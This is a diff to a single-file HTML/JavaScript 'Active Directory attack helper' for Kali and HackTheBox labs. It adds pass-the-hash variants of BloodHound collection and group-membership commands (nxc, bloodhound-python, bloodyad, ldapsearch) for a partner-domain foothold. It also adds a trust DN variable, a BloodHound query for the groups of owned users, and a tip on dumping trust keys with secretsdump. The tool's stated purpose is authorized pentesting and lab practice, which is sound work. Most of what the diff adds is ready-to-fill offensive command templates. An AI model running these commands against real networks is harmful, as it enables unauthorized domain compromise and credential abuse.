@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Hackerman v1.15.0 — AD Attack Helper (Kali · HTB)</title>
+<title>Hackerman v1.15.1 — AD Attack Helper (Kali · HTB)</title>
 <style>
 :root{
   --bg:#0a0f1a; --panel:#0f1729; --panel2:#131d33; --line:#1e2b45;
@@ -221,7 +221,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
 
 <header>
   <div class="hwrap">
-    <div class="brand">Hackerman <b>v1.15.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
+    <div class="brand">Hackerman <b>v1.15.1</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
     <div class="hactions">
       <select id="presetSel" title="Load preset"><option value="">— presets —</option></select>
       <button id="presetSave" title="Save current context as preset">Save</button>
@@ -276,7 +276,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
   <section id="tab-legend" class="tab"></section>
 </main>
 
-<footer class="mono">Hackerman v1.15.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
+<footer class="mono">Hackerman v1.15.1 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
 
 <div id="focusOverlay" class="hidden">
   <div id="focusBox" role="dialog" aria-modal="true" tabindex="-1" aria-label="recipe focus">
@@ -327,6 +327,7 @@ const VAR_DEFS = [
   {k:'dc_dn',       label:'DC DN',         ph:'CN=PROD-DC,OU=DOMAIN CONTROLLERS,DC=ARGON,DC=HTB', grp:'Domain / DC', color:'v-host', tip:'distinguishedName of the DC: <span class="mono">bloodyad get object "DC01$" --attr distinguishedName</span> or <span class="mono">ldapsearch -H ldaps://&lt;dc&gt;</span>'},
   {k:'trust_domain',label:'Trust domain', ph:'htb.local',                 grp:'Domain / DC', color:'v-domain', tip:'FQDN of the partner domain: <span class="mono">bloodyad get trusts</span> / <span class="mono">nxc ldap --dc-list</span> / Windows: <span class="mono">nltest /domain_trusts</span>'},
   {k:'trust_realm', label:'Trust realm',   ph:'HTB.LOCAL',                 grp:'Domain / DC', color:'v-domain', derive:s=>(s.trust_domain||'').toUpperCase(), src:['trust_domain'], hint:'trust_domain → UPPERCASE'},
+  {k:'trust_domain_dn',label:'Trust DN',   ph:'DC=HTB,DC=LOCAL',           grp:'Domain / DC', color:'v-host', derive:s=>s.trust_domain?('DC='+s.trust_domain.split('.').join(',DC=')):'', src:['trust_domain'], hint:"'DC=' + trust_domain parts"},
   {k:'trust_dc_ip', label:'Trust DC IP',  ph:'172.16.6.200',              grp:'Domain / DC', color:'v-ip', tip:'IP of the trusted domain DC (trust-enum recipe: <span class="mono">--dc-list</span>, DNS, or given)'},
   {k:'trust_netbios',label:'Trust NetBIOS',ph:'HTB',                      grp:'Domain / DC', color:'v-domain', tip:'NetBIOS (flatName) of the partner: <span class="mono">nxc ldap &lt;dc&gt; -u .. -p .. --dc-list</span> or <span class="mono">ldapsearch -H ldaps://&lt;dc&gt; ... (objectClass=trustedDomain) flatName</span>'},
   {k:'target_host', label:'Target host',   ph:'prod-sql',                  grp:'Target', color:'v-host', req:1, tip:'short hostname of the machine you attack next (recon / BloodHound sessions)'},
@@ -345,6 +346,7 @@ const VAR_DEFS = [
   {k:'trust_key',   label:'Trust key',     ph:'NT hash of <trust_netbios>$',grp:'Access', color:'v-hash', tip:'NT hash of the partner trust account: <span class="mono">secretsdump -just-dc-user "&lt;trust_netbios&gt;$"</span>. Only RC4/NT works for forging (AES derivations cannot request a TGT).'},
   {k:'trust_user',  label:'2nd domain user',ph:'it.user',                 grp:'Access', color:'v-user', tip:'your foothold account in the second/partner domain (e.g. the IT group user)'},
   {k:'trust_pass',  label:'2nd domain pass',ph:'…',                       grp:'Access', color:'v-secret', tip:'password of the second-domain account'},
+  {k:'trust_nthash',label:'2nd domain hash',ph:'c5f7e15cca6397af…',        grp:'Access', color:'v-hash', tip:'NT hash of the second-domain account — enables the <span class="mono">-H</span> / <span class="mono">--hashes</span> collector and lookup variants'},
   {k:'domain_sid',  label:'Own domain SID',ph:'S-1-5-21-…',                grp:'Access', color:'v-sid', tip:'<span class="mono">nxc ldap &lt;dc&gt; -u .. -p .. --get-sid</span> / <span class="mono">impacket-lookupsid</span> / <span class="mono">bloodyad get object "&lt;domain_dn&gt;" --attr objectSid</span>'},
   {k:'trust_domain_sid',label:'Trust SID', ph:'S-1-5-21-…',                grp:'Access', color:'v-sid', tip:'<span class="mono">--get-sid</span> against the trusted DC, or BloodHound query "Domain SIDs" (<span class="mono">d.objectid</span>)'},
   {k:'extra_sid',   label:'Extra SID',     ph:'S-1-5-21-…-519',            grp:'Access', color:'v-sid', tip:'target domain SID + <span class="mono">-519</span> (Enterprise Admins) — see trust-sid-history; BloodHound "Domain SIDs"'},
@@ -1165,7 +1167,7 @@ function renderLegend(){
   const tab = $('#tab-legend');
   tab.innerHTML = '';
   const about = document.createElement('div');
-  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.15.0</h2>' +
+  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.15.1</h2>' +
     '<p class="dim">Single-file Active Directory attack helper for Kali, built by <b>@bongoalex</b> with <b>deepseek</b>. ' +
     RECIPES.length + ' recipes · ' + FLOWS.length + ' wizard flows · ' + CYPHER.length + ' BloodHound queries. Offline, no dependencies, no telemetry.</p>' +
     '<p class="dim">Use only for authorized testing (HTB labs, your own infrastructure, signed engagements). Syntax is version-sensitive — cross-check against your target versions.</p>';
@@ -2660,15 +2662,21 @@ cmds:[
 
 R({id:'second-domain',cat:'trust',title:'Second domain foothold — collect, map, mark',desc:'You now have an account in the partner domain (for example a member of the IT group): ingest its data, flatten your group and mark what you own.',
 cmds:[
- [`nxc ldap {{trust_dc_ip}} -d {{trust_domain}} -u '{{trust_user}}' -p '{{trust_pass}}' --bloodhound -c All --dns-server {{trust_dc_ip}}`,'collect the partner domain (CE collector)'],
- [`bloodhound-python -d {{trust_domain}} -u '{{trust_user}}' -p '{{trust_pass}}' -ns {{trust_dc_ip}} -c All`,'or Python collector','n'],
+ [`nxc ldap {{trust_dc_ip}} -d {{trust_domain}} -u '{{trust_user}}' -p '{{trust_pass}}' --bloodhound -c All --dns-server {{trust_dc_ip}}`,'collect the partner domain (password)'],
+ [`nxc ldap {{trust_dc_ip}} -d {{trust_domain}} -u '{{trust_user}}' -H '{{trust_nthash}}' --bloodhound -c All --dns-server {{trust_dc_ip}}`,'collect with NT hash (-H)'],
+ [`bloodhound-python -d {{trust_domain}} -u '{{trust_user}}' -p '{{trust_pass}}' -ns {{trust_dc_ip}} -c All`,'or Python collector (password)','n'],
+ [`bloodhound-python -d {{trust_domain}} -u '{{trust_user}}' --hashes ':{{trust_nthash}}' -ns {{trust_dc_ip}} -c All`,'Python collector with hash','n'],
  [`bhcli upload *.zip`,'ingest into BloodHound CE'],
  [`bhcli domains --sid`,'confirm both domains and their SIDs'],
  [`nxc ldap {{trust_dc_ip}} -d {{trust_domain}} -u '{{trust_user}}' -p '{{trust_pass}}' --groups`,'quick LDAP look at the partner groups'],
- [`bhcli members --indirect 'IT@{{trust_realm}}'`,'flatten the group you are in (replace IT)'],
+ [`nxc ldap {{trust_dc_ip}} -d {{trust_domain}} -u '{{trust_user}}' -H '{{trust_nthash}}' --groups`,'same groups list via -H'],
+ [`bloodyad --host {{trust_dc_ip}} -d {{trust_domain}} -u '{{trust_user}}' -p '{{trust_pass}}' get membership '{{trust_user}}'`,'which groups is my user in? (nested, too)'],
+ [`bloodyad --host {{trust_dc_ip}} -d {{trust_domain}} -u '{{trust_user}}' -p ':{{trust_nthash}}' get membership '{{trust_user}}'`,'memberships via PtH'],
+ [`LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://{{trust_dc_ip}} -D '{{trust_user}}@{{trust_domain}}' -w '{{trust_pass}}' -b '{{trust_domain_dn}}' '(sAMAccountName={{trust_user}})' memberOf`,'raw memberOf — find your group'],
+ [`bhcli members --indirect 'IT@{{trust_realm}}'`,'flatten the group you found (replace IT)'],
  [`bhcli mark Owned '{{trust_user}}@{{trust_realm}}'`,'mark your partner-domain foothold'],
  [`bhcli audit -d {{trust_domain}}`,'quick-win check in the partner domain']
-],note:'Order: collect → <span class="mono">bhcli upload</span> → mark → query. Point the collector at the partner DC for DNS (<span class="mono">-ns</span>/<span class="mono">--dns-server</span>) or add it to <span class="mono">/etc/hosts</span>. BloodHound group labels are uppercase <span class="mono">GROUP@REALM</span> — use <span class="mono">{{trust_realm}}</span>. Then find the group rights with the "What a group controls", "Sessions of group members" and "Local admin / remote access of group members" queries, and abuse them with the ACL recipes (bloodyAD, dacl-*). Marking the Domain node as Owned (CE GUI) plus your users/computers makes the owned→Domain Admins query span both domains.'});
+],note:'Order: collect → <span class="mono">bhcli upload</span> → mark → query. Point the collector at the partner DC for DNS (<span class="mono">-ns</span>/<span class="mono">--dns-server</span>) or add it to <span class="mono">/etc/hosts</span>. <b>Do not know your group yet?</b> <span class="mono">bloodyad get membership</span> (or the <span class="mono">memberOf</span> ldapsearch, or the BloodHound "Groups of owned users" query) lists every nested group of your user — then flatten it with <span class="mono">bhcli members --indirect \'GROUP@{{trust_realm}}\'</span>. BloodHound group labels are uppercase <span class="mono">GROUP@REALM</span>. Find the group rights with the "What a group controls", "Sessions of group members" and "Local admin / remote access of group members" queries, and abuse them with the ACL recipes (bloodyAD, dacl-*). Marking the Domain node as Owned (CE GUI) plus your users/computers makes the owned→Domain Admins query span both domains.'});
 
 /* ===== BLOODHOUND COLLECTION ===== */
 R({id:'bh-python',cat:'bh',title:'bloodhound-python collection',desc:'Collect from Linux — all the data needed for pathfinding.',
@@ -2816,7 +2824,7 @@ need:['trust_user'], needAny:['trust_pass'],
 steps:[
  {t:'Collect & ingest the partner domain',d:'Run a collector against the partner DC, then upload and confirm both domains.',r:['second-domain']},
  {t:'Mark what you own',d:'Tag partner-domain users/computers via bhcli; mark groups and the Domain node in the CE GUI.',r:['bhcli-mark-owned']},
- {t:'Map your group',d:'Flatten nested memberships, audit the domain and check stats.',r:['bhcli-recon']},
+ {t:'Map your group',d:'First find your groups (get membership / memberOf), then flatten nested memberships and audit.',r:['second-domain','bhcli-recon']},
  {t:'What can the group do?',d:'Run the group queries (rights, sessions, local admin) and check writable objects.',r:['dacl-enum','bloodyad-writable']},
  {t:'Abuse the rights',d:'ACL takeover, shadow credentials, RBCD or ADCS depending on the edges you found.',r:['dacl-genericall-user','dacl-genericall-computer','shadow-creds','adcs-find']},
  {t:'Cross-domain follow-up',d:'If the partner path continues, check trusts and cross-trust coercion/relay.',r:['trust-enum','trust-coerce-relay']}
@@ -2887,7 +2895,7 @@ cmds:[
  [`bhcli cypher 'MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name' | jq -c '.nodes[].properties.name'`,'unconstrained delegation hosts'],
  [`bhcli queries hackerman-bhcli-queries.json`,'import all queries from the export button below'],
  [`bhcli cypher "$(cat query.cypher)" | jq`,'run a query from a file']
-],note:'<span class="mono">cypher</span> prints JSON with <span class="mono">nodes</span>/<span class="mono">relationships</span> arrays — the jq snippets flatten them. Use the <b>bhcli</b> copy button on any query below to get the exact command, or import all 42 with the export button. Everything runs server-side against CE, so the PostgreSQL backend works too.'});
+],note:'<span class="mono">cypher</span> prints JSON with <span class="mono">nodes</span>/<span class="mono">relationships</span> arrays — the jq snippets flatten them. Use the <b>bhcli</b> copy button on any query below to get the exact command, or import all 43 with the export button. Everything runs server-side against CE, so the PostgreSQL backend works too.'});
 
 R({id:'bhcli-alternatives',cat:'bh',title:'BloodHound CLI alternatives',desc:'Other terminal clients for BloodHound/Neo4j and when to pick which.',
 cmds:[
@@ -3140,7 +3148,7 @@ function zshEmit(data){
   const fnName = n => '_hk_' + n.replace(/[^A-Za-z0-9_]/g, '_');
   const q = s => "'" + String(s).replace(/'/g, "'\\''") + "'";
   let out = '#compdef ' + names.concat(Object.keys(aliases)).join(' ') + '\n';
-  out += '# Hackerman v1.15.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
+  out += '# Hackerman v1.15.1 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
   out += '_hackerman() {\n  local tool=${words[1]:t}\n  case $tool in\n';
   names.forEach(n => { out += '    ' + n + ') ' + fnName(n) + ' ;;\n'; });
   Object.keys(aliases).forEach(a => { out += '    ' + a + ') ' + fnName(aliases[a]) + ' ;;\n'; });
@@ -3294,6 +3302,7 @@ CYPHER.push(
 {t:'ADCS CA permissions (ESC7)',q:'MATCH p=(u)-[:ManageCA|ManageCertificates|GenericAll|WriteDacl|WriteOwner]->(ca:EnterpriseCA) RETURN p',n:'Requires BloodHound CE ADCS collection. ManageCA/ManageCertificates rights enable the ESC7 path (see the certipy ca recipe).'},
 {t:'Domain SIDs (for extra-sid)',q:'MATCH (d:Domain) RETURN d.name, d.objectid',n:'Domain SIDs as <span class="mono">objectid</span> — add <span class="mono">-519</span> for Enterprise Admins (extra-sid) or use them for golden tickets.'},
 {t:'Owned principals per domain',q:'MATCH (n {owned:true}) RETURN n.name, n.domain ORDER BY n.domain',n:'Verify your footholds are tagged in both domains before running path queries.'},
+{t:'Groups of owned users (which group am I in?)',q:'MATCH p=(u:User {owned:true})-[:MemberOf*1..]->(g:Group) RETURN p',n:'Discovery step: every (nested) group of your owned users — feed the group name into the "What a group controls" query (e.g. IT@SECOND.LOCAL).'},
 {t:'Owned → Tier Zero (CE tag + legacy)',q:'MATCH p=shortestPath((o {owned:true})-[*1..]->(t)) WHERE "admin_tier_0" IN coalesce(t.system_tags, []) OR coalesce(t.highvalue, false) RETURN p',n:'BloodHound CE tags Tier Zero objects in <span class="mono">system_tags</span>, legacy uses <span class="mono">highvalue</span> — both are covered.'},
 {t:'Owned → any Domain Admins group (all domains)',q:'MATCH (g:Group) WHERE g.objectid ENDS WITH "-512" MATCH p=shortestPath((o {owned:true})-[*1..]->(g)) RETURN p',n:'RID -512 = Domain Admins in every domain — catches the second/partner domain too.'},
 {t:'What a group controls (replace GROUP/REALM)',q:'MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"<GROUP>@<REALM>"}) MATCH p=(u)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|AllExtendedRights|AddMember|AddSelf|ForceChangePassword|AddKeyCredentialLink|WriteSPN|AllowedToAct|AllowedToDelegate]->(t) RETURN p',n:'The "what can IT do" query: dangerous outbound rights of every (nested) member. Replace <span class="mono">&lt;GROUP&gt;@&lt;REALM&gt;</span>, e.g. <span class="mono">IT@{{trust_realm}}</span>.'},
